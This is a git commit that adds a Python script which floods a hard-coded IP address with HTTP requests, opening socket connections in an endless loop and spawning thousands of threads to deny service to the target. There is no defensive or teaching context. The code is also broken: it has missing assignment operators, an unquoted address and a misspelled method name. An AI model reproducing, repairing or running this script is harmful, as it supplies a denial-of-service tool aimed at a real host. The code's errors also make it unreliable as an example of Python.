0332e1bdc9e71460526f3da5e107bbef15cd624e
ProUser777 <91127656+ProUser777@users.noreply.github.com>
2021-10-24 14:07:50 +0300

    Create .py

---
+++ .py
@@ -0,0 +1,20 @@
+import threading 
+import socket
+
+target = '51.38.169.89'
+port 80
+fake_ip 12.122.155.10
+
+already_connected = 0
+
+def attack():
+  while True:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connecy((target, port))
+    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
+    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target,port))
+    s.close()
+    
+    for i in range(10000):
+      thread = threading.Thread(target=attack)
+      thread.start()
